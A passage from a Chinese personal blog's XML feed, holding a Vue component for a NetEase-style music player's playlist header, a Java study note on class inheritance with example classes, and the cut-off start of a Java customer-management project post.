&lt;span&gt;歌单&lt;/span&gt;</span><br><span class="line">        &lt;/van-col&gt;</span><br><span class="line">        &lt;van-col span=&quot;8&quot; class=&quot;itemRight&quot;&gt;</span><br><span class="line">            &lt;van-icon name=&quot;search&quot; class=&quot;search&quot; size=&quot;25&quot; /&gt;</span><br><span class="line">            &lt;van-icon name=&quot;wap-nav&quot; class=&quot;wap-nav&quot; size=&quot;25&quot; /&gt;</span><br><span class="line">        &lt;/van-col&gt;</span><br><span class="line">    &lt;/van-row&gt;</span><br><span class="line">    &lt;van-row justify=&quot;space-between&quot; align=&quot;center&quot; class=&quot;itemMusicCenter&quot;&gt;</span><br><span class="line">        &lt;van-col span=&quot;10&quot; class=&quot;imgBox&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;imgBoxAndplayCount&quot;&gt;</span><br><span class="line">                &lt;span class=&quot;playCount&quot;&gt;</span><br><span class="line">                    &lt;svg class=&quot;icon&quot; aria-hidden=&quot;true&quot;&gt;</span><br><span class="line">                        &lt;use xlink:href=&#x27;#icon-bofang1&#x27;&gt;&lt;/use&gt;</span><br><span class="line">                    &lt;/svg&gt;</span><br><span class="line">                    &#123;&#123; changeCount(playlist.playCount) &#125;&#125;</span><br><span class="line">                &lt;/span&gt;</span><br><span class="line">                &lt;img :src=&quot;playlist.coverImgUrl&quot; alt=&quot;&quot; class=&quot;coverImg&quot;&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &lt;/van-col&gt;</span><br><span class="line">        &lt;van-col span=&quot;14&quot;&gt;</span><br><span class="line">            &lt;van-row justify=&quot;center&quot; class=&quot;listInfo&quot;&gt;</span><br><span class="line">                &lt;van-col span=&quot;30&quot; class=&quot;title&quot;&gt;&#123;&#123; playlist.name &#125;&#125;&lt;/van-col&gt;</span><br><span class="line">                &lt;van-col span=&quot;30&quot; class=&quot;creator&quot;&gt;</span><br><span class="line">                    &lt;img :src=&quot;playlist.creator.avatarUrl&quot; alt=&quot;&quot;&gt;</span><br><span class="line">                    &lt;span&gt;</span><br><span class="line">                        &#123;&#123; playlist.creator.nickname &#125;&#125;</span><br><span class="line">                        &lt;van-icon name=&quot;arrow&quot; size=&quot;15&quot; /&gt;</span><br><span class="line">                    &lt;/span&gt;</span><br><span class="line">                &lt;/van-col&gt;</span><br><span class="line">                &lt;van-col span=&quot;30&quot; class=&quot;description&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;text&quot;&gt;</span><br><span class="line">                        &#123;&#123; playlist.description &#125;&#125;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;van-icon name=&quot;arrow&quot; size=&quot;15&quot; /&gt;</span><br><span class="line">                &lt;/van-col&gt;</span><br><span class="line">            &lt;/van-row&gt;</span><br><span class="line">        &lt;/van-col&gt;</span><br><span class="line">    &lt;/van-row&gt;</span><br><span class="line">    &lt;van-row justify=&quot;space-between&quot; align=&quot;center&quot; class=&quot;functionButtons&quot;&gt;</span><br><span class="line">        &lt;van-col span=&quot;6&quot;&gt;</span><br><span class="line">            &lt;van-icon name=&quot;chat-o&quot; size=&quot;30&quot; /&gt;</span><br><span class="line">            &lt;span&gt;&#123;&#123; playlist.commentCount &#125;&#125;&lt;/span&gt;</span><br><span class="line">        &lt;/van-col&gt;</span><br><span class="line">        &lt;van-col span=&quot;6&quot;&gt;</span><br><span class="line">            &lt;van-icon name=&quot;share-o&quot; size=&quot;30&quot; /&gt;</span><br><span class="line">            &lt;span&gt;&#123;&#123; playlist.shareCount &#125;&#125;&lt;/span&gt;</span><br><span class="line">        &lt;/van-col&gt;</span><br><span class="line">        &lt;van-col span=&quot;6&quot;&gt;</span><br><span class="line">            &lt;van-icon name=&quot;down&quot; size=&quot;30&quot; /&gt;</span><br><span class="line">            &lt;span&gt;下载&lt;/span&gt;</span><br><span class="line">        &lt;/van-col&gt;</span><br><span class="line">        &lt;van-col span=&quot;6&quot;&gt;</span><br><span class="line">            &lt;van-icon name=&quot;add-o&quot; size=&quot;30&quot; /&gt;</span><br><span class="line">            &lt;span&gt;多选&lt;/span&gt;</span><br><span class="line">        &lt;/van-col&gt;</span><br><span class="line">    &lt;/van-row&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import &#123; getMusicItemList &#125; from &#x27;@/request/api/item&#x27;</span><br><span class="line">export default &#123;</span><br><span class="line">    name: &quot;itemMusicTop&quot;,</span><br><span class="line">    props: [&#x27;playlist&#x27;],</span><br><span class="line">    setup(props) &#123;</span><br><span class="line">        // console.log(props);</span><br><span class="line">        // 通过props进行传值，判断如果没有，则从sessionStorage获取</span><br><span class="line">        if ((props.playlist.creator = &quot;&quot;)) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                console.log(&quot;here&quot;);</span><br><span class="line">                props.playlist.creator = JSON.parse(sessionStorage.getItem(&#x27;itemDetail&#x27;)).playlist.creator</span><br><span class="line">            &#125;</span><br><span class="line">            catch &#123;</span><br><span class="line">                console.log(&quot;here&quot;);</span><br><span class="line">                let response = getMusicItemList(playlistId)</span><br><span class="line">                playlist = response.data.playlist</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        function changeCount(num) &#123;</span><br><span class="line">            if (num &gt;= 100000000) &#123;</span><br><span class="line">                // toFixed(1) 小数点后一位</span><br><span class="line">                return (num / 100000000).toFixed(1) + &quot;亿&quot;</span><br><span class="line">            &#125; else if (num &gt;= 10000) &#123;</span><br><span class="line">                return (num / 10000).toFixed(1) + &quot;万&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return &#123;</span><br><span class="line">            changeCount</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang=&quot;less&quot; scoped&gt;</span><br><span class="line">.itemMusicTop &#123;</span><br><span class="line">    height: 50px;</span><br><span class="line">    padding: 10px;</span><br><span class="line"></span><br><span class="line">    .itemLeft,</span><br><span class="line">    .itemRight &#123;</span><br><span class="line"></span><br><span class="line">        .van-icon &#123;</span><br><span class="line">            color: #fff;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .itemLeft &#123;</span><br><span class="line">        span &#123;</span><br><span class="line">            position: relative;</span><br><span class="line">            font-size: 25px;</span><br><span class="line">            margin-left: 30px;</span><br><span class="line">            top: -2.5px;</span><br><span class="line">            color: #fff;</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .itemRight &#123;</span><br><span class="line">        position: absolute;</span><br><span class="line">        right: 10px;</span><br><span class="line"></span><br><span class="line">        .search &#123;</span><br><span class="line">            margin-right: 40px;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.bgImg &#123;</span><br><span class="line">    position: fixed;</span><br><span class="line">    width: 100%;</span><br><span class="line">    height: 350px;</span><br><span class="line">    z-index: -1;</span><br><span class="line">    filter: blur(40px);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.itemMusicCenter &#123;</span><br><span class="line">    margin-top: -15px;</span><br><span class="line">    padding: 10px;</span><br><span class="line">    height: 180px;</span><br><span class="line"></span><br><span class="line">    .imgBox &#123;</span><br><span class="line">        padding: 5px;</span><br><span class="line">        width: 150px;</span><br><span class="line">        text-align: center;</span><br><span class="line"></span><br><span class="line">        .imgBoxAndplayCount &#123;</span><br><span class="line">            position: relative;</span><br><span class="line">            height: 130px;</span><br><span class="line">            width: 130px;</span><br><span class="line"></span><br><span class="line">            .coverImg &#123;</span><br><span class="line">                border-radius: 0.4rem;</span><br><span class="line">                height: 130px;</span><br><span class="line">                width: 130px;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            .playCount &#123;</span><br><span class="line">                position: absolute;</span><br><span class="line">                right: 0.1rem;</span><br><span class="line">                top: 0.1rem;</span><br><span class="line">                font-size: 0.25rem;</span><br><span class="line">                color: #ccc;</span><br><span class="line">                display: flex;</span><br><span class="line">                align-items: center;</span><br><span class="line">                background-color: rgba(0, 0, 0, 0.2);</span><br><span class="line">                margin: 4px;</span><br><span class="line">                padding: 3px;</span><br><span class="line">                border-radius: 0.4rem;</span><br><span class="line"></span><br><span class="line">                .icon &#123;</span><br><span class="line">                    width: 15px;</span><br><span class="line">                    fill: #ccc;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    .listInfo &#123;</span><br><span class="line">        padding: 5px;</span><br><span class="line">        flex-flow: column;</span><br><span class="line">        width: 100%;</span><br><span class="line">        height: 150px;</span><br><span class="line"></span><br><span class="line">        .title &#123;</span><br><span class="line">            font-weight: 900;</span><br><span class="line">            color: #fff;</span><br><span class="line">            font-size: .39rem;</span><br><span class="line">            text-overflow: ellipsis;</span><br><span class="line">            white-space: nowrap;</span><br><span class="line">            overflow: hidden;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .creator &#123;</span><br><span class="line">            padding: 10px 5px;</span><br><span class="line">            color: #ccc;</span><br><span class="line"></span><br><span class="line">            img &#123;</span><br><span class="line">                position: relative;</span><br><span class="line">                border-radius: 0.6rem;</span><br><span class="line">                height: 30px;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            span &#123;</span><br><span class="line">                position: absolute;</span><br><span class="line">                padding-left: 10px;</span><br><span class="line">                width: 160px;</span><br><span class="line">                font-size: .32rem;</span><br><span class="line">                line-height: 30px;</span><br><span class="line">                text-overflow: ellipsis;</span><br><span class="line">                white-space: nowrap;</span><br><span class="line">                overflow: hidden;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            .van-icon &#123;</span><br><span class="line">                position: absolute;</span><br><span class="line">                bottom: 7.5px;</span><br><span class="line">                padding-left: 15px;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .description &#123;</span><br><span class="line">            position: relative;</span><br><span class="line">            color: #ccc;</span><br><span class="line">            // width: 80%;</span><br><span class="line">            height: 80px;</span><br><span class="line"></span><br><span class="line">            .text &#123;</span><br><span class="line">                position: absolute;</span><br><span class="line">                display: -webkit-box;</span><br><span class="line">                -webkit-box-orient: vertical;</span><br><span class="line">                -webkit-line-clamp: 4;</span><br><span class="line">                overflow: hidden;</span><br><span class="line">                width: 85%;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            .van-icon &#123;</span><br><span class="line">                position: absolute;</span><br><span class="line">                right: 13px;</span><br><span class="line">                top: 27px;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.functionButtons &#123;</span><br><span class="line">    color: #fff;</span><br><span class="line">    height: 1.5rem;</span><br><span class="line">    padding: 5px;</span><br><span class="line">    margin-bottom: 10px;</span><br><span class="line"></span><br><span class="line">    .van-col &#123;</span><br><span class="line">        display: flex;</span><br><span class="line">        flex-direction: column;</span><br><span class="line">        align-items: center;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;2022-07-20 03:29:47 星期三&lt;/p&gt;

    &lt;div class=&quot;tag-plugin audio&quot;&gt;
    &lt;iframe src=&quot;//music.163.com/outchain/player?type=2&amp;id=1958557200&amp;aut</summary>
      
    
    
    
    <category term="Vue前端" scheme="https://www.bandao.ltd/categories/Vue%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="网易云" scheme="https://www.bandao.ltd/tags/%E7%BD%91%E6%98%93%E4%BA%91/"/>
    
    <category term="vue" scheme="https://www.bandao.ltd/tags/vue/"/>
    
    <category term="工程" scheme="https://www.bandao.ltd/tags/%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="音乐播放器" scheme="https://www.bandao.ltd/tags/%E9%9F%B3%E4%B9%90%E6%92%AD%E6%94%BE%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>java学习笔记12</title>
    <link href="https://www.bandao.ltd/coding/java/note/12.html"/>
    <id>https://www.bandao.ltd/coding/java/note/12.html</id>
    <published>2022-03-10T09:05:00.000Z</published>
    <updated>2024-11-04T03:12:49.883Z</updated>
    
    <content type="html"><![CDATA[<h2 id="面向对象的特征之二：继承性-why"><a href="#面向对象的特征之二：继承性-why" class="headerlink" title="面向对象的特征之二：继承性 why?"></a>面向对象的特征之二：继承性 why?</h2><h3 id="一、继承性的好处："><a href="#一、继承性的好处：" class="headerlink" title="一、继承性的好处："></a>一、继承性的好处：</h3><ol><li>减少了代码的冗余，提高了代码的复用性</li><li>便于功能的扩展</li><li>为之后多态性的使用，提供了前提</li></ol><h3 id="二、继承性的格式："><a href="#二、继承性的格式：" class="headerlink" title="二、继承性的格式："></a>二、继承性的格式：</h3><ul><li>class A extends B{}</li><li>A:子类、派生类、subclass</li><li>B:父类、超类、基类、superclass</li></ul><h4 id="2-1-体现：一旦子类-A-继承父类-B-以后，子类-A-中就获取了父类-B-中声明的所有的属性和方法。"><a href="#2-1-体现：一旦子类-A-继承父类-B-以后，子类-A-中就获取了父类-B-中声明的所有的属性和方法。" class="headerlink" title="2.1 体现：一旦子类 A 继承父类 B 以后，子类 A 中就获取了父类 B 中声明的所有的属性和方法。"></a>2.1 体现：一旦子类 A 继承父类 B 以后，子类 A 中就获取了父类 B 中声明的所有的属性和方法。</h4><ul><li>特别的，父类中声明为 private 的属性或方法，子类继承父类以后，仍然认为获取了父类中私有的结构。</li><li>只有因为封装性的影响，使得子类不能直接调用父类的结构而已。</li></ul><h4 id="2-2-子类继承父类以后，还可以声明自己特有的属性或方法：实现功能的拓展。"><a href="#2-2-子类继承父类以后，还可以声明自己特有的属性或方法：实现功能的拓展。" class="headerlink" title="2.2 子类继承父类以后，还可以声明自己特有的属性或方法：实现功能的拓展。"></a>2.2 子类继承父类以后，还可以声明自己特有的属性或方法：实现功能的拓展。</h4><ul><li>子类和父类的关系，不同于子集和集合的关系。</li><li>extends：延展、扩展</li></ul><h3 id="三、Java-中关于继承性的规定："><a href="#三、Java-中关于继承性的规定：" class="headerlink" title="三、Java 中关于继承性的规定："></a>三、Java 中关于继承性的规定：</h3><ol><li>一个类可以被多个子类继承。</li><li>Java 中类的单继承性：一个类只能有一个父类</li><li>子父类是相对的概念。</li><li>子类直接继承的父类，称为：直接父类。间接继承的父类称为：间接父类</li><li>子类继承父类以后，就获取了直接父类以及所有间接父类中声明的属性和方法</li></ol><h3 id="四、-Object-类"><a href="#四、-Object-类" class="headerlink" title="四、 Object 类"></a>四、 Object 类</h3><ol><li>如果我们没有显式的声明一个类的父类的话，则此类继承于 java.lang.Object 类</li><li>所有的 java 类（除 java.lang.Object 类之外）都直接或间接的继承于 java.lang.Object 类</li><li>意味着，所有的 java 类具有 java.lang.Object 类声明的功能。</li></ol><h4 id="Creature-java"><a href="#Creature-java" class="headerlink" title="Creature.java"></a>Creature.java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project13</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: Creature类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2022-03-10 16:31</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Creature</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">breath</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;呼吸&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Person-java"><a href="#Person-java" class="headerlink" title="Person.java"></a>Person.java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project13</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: Person类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2022-03-10 15:50</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">extends</span> <span class="title class_">Creature</span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;吃饭&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;睡觉&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Student-java"><a href="#Student-java" class="headerlink" title="Student.java"></a>Student.java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project13</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: Student类，继承</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2022-01-05 10:22</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line"><span class="comment">//    String name;</span></span><br><span class="line"><span class="comment">//    int age;</span></span><br><span class="line">    String major;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String name, <span class="type">int</span> age, String major)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line"><span class="comment">//        this.age = age;</span></span><br><span class="line">        setAge(age);</span><br><span class="line">        <span class="built_in">this</span>.major = major;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public void sleep()&#123;</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;睡觉&quot;);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">study</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;studying&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name:&quot;</span> + name + <span class="string">&quot;, age:&quot;</span> + getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ExtendsTest-java"><a href="#ExtendsTest-java" class="headerlink" title="ExtendsTest.java"></a>ExtendsTest.java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project13</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: 继承测试</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2022-01-05 10:24</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExtendsTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="comment">//        p1.age = 1;</span></span><br><span class="line">        p1.eat();</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        <span class="type">Student</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        s1.eat();</span><br><span class="line">        s1.sleep();</span><br><span class="line"></span><br><span class="line">        s1.name = <span class="string">&quot;Tom&quot;</span>;</span><br><span class="line">        s1.setAge(<span class="number">10</span>);</span><br><span class="line">        s1.show();</span><br><span class="line">        s1.breath();</span><br><span class="line"></span><br><span class="line">        <span class="type">Creature</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Creature</span>();</span><br><span class="line">        System.out.println(c.toString());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;面向对象的特征之二：继承性-why&quot;&gt;&lt;a href=&quot;#面向对象的特征之二：继承性-why&quot; class=&quot;headerlink&quot; title=&quot;面向对象的特征之二：继承性 why?&quot;&gt;&lt;/a&gt;面向对象的特征之二：继承性 why?&lt;/h2&gt;&lt;h3 id=&quot;一、继</summary>
      
    
    
    
    <category term="Java学习笔记" scheme="https://www.bandao.ltd/categories/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Java" scheme="https://www.bandao.ltd/tags/Java/"/>
    
    <category term="学习笔记" scheme="https://www.bandao.ltd/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="基础" scheme="https://www.bandao.ltd/tags/%E5%9F%BA%E7%A1%80/"/>
    
    <category term="类" scheme="https://www.bandao.ltd/tags/%E7%B1%BB/"/>
    
    <category term="继承性" scheme="https://www.bandao.ltd/tags/%E7%BB%A7%E6%89%BF%E6%80%A7/"/>
    
  </entry>
  
  <entry>
    <title>java project 客户管理信息软件</title>
    <link href="https://www.bandao.ltd/coding/java/project/2.html"/>
    <id>https://www.bandao.ltd/coding/java/project/2.html</id>
    <published>2022-01-05T01:42:00.000Z</published>
    <updated>2024-11-04T03:12:49.887Z</updated>
    
    <content type="html"><![CDATA[    <div class="tag-plugin audio">    <iframe src="//music.163.com/outchain/player?type=2&id=1886456269&auto=0&height=32" frameborder="no" border="0" marginwidth="0" marginheight="0" width=288px height=52>    </iframe>    </div>    <h2 id="客户管理信息软件"><a href="#客户管理信息软件" class="headerlink" title="客户管理信息软件"></a>客户管理信息软件</h2><h2 id="参考视频（p248-p259）"><a href="#参考视频（p248-p259）" class="headerlink" title="参考视频（p248-p259）"></a>参考视频（p248-p259）</h2><p>{bilibili bvid&#x3D;”1Kb411W75N” page&#x3D;”248”&#x2F;}</p><h2 id="CustomerView-主模块，菜单显示"><a href="#CustomerView-主模块，菜单显示" class="headerlink" title="CustomerView 主模块，菜单显示"></a>CustomerView 主模块，菜单显示</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span 